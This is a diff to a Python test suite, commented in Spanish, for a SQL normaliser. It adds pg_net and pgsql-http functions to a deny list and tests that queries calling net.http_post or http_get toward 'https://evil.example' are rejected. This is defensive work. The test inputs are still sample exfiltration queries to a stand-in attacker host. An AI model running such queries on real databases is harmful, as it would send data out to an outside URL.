@@ -228,6 +228,11 @@ VETADAS = [
     "pg_copy_logical_replication_slot",
     "pg_drop_replication_slot",
     "pg_replication_slot_advance",
+    # Peticiones HTTP salientes: pg_net (esquema net) y pgsql-http.
+    "net",
+    "http_get",
+    "http_post",
+    "http",
 ]
 
 
@@ -289,6 +294,9 @@ def test_funcion_vetada_rechazada(nombre: str, plantilla: str) -> None:
         "SELECT mi_set_config FROM t",
         "SELECT 1 FROM t WHERE x = 'pg_cancel_backend'",
         "SELECT U&'pg_notify'",
+        "SELECT 'net.http_post(1)'",
+        "SELECT 1 -- net.http_get('x')",
+        "SELECT neto, internet FROM t",
     ],
 )
 def test_nombre_en_literal_o_comentario_no_se_rechaza(sql: str) -> None:
@@ -347,3 +355,19 @@ def test_serializar_decimal_enorme_no_da_infinity() -> None:
     valor = serializar_valor(Decimal("1e400"))
     assert valor == "1E+400"
     json.dumps(valor, allow_nan=False)
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT net.http_post('https://evil.example', '{}'::jsonb)",
+        'SELECT "net"."http_get"(\'https://evil.example\')',
+        "SELECT net . /* x */ http_get('https://evil.example')",
+        "SELECT http_get('https://evil.example')",
+    ],
+)
+def test_peticiones_http_salientes_rechazadas(sql: str) -> None:
+    # pg_net es ejecutable por PUBLIC en Supabase: sacaría datos a una URL.
+    with pytest.raises(ErrorConsulta) as e:
+        normalizar_sql(sql)
+    assert "no está permitida" in e.value.mensaje
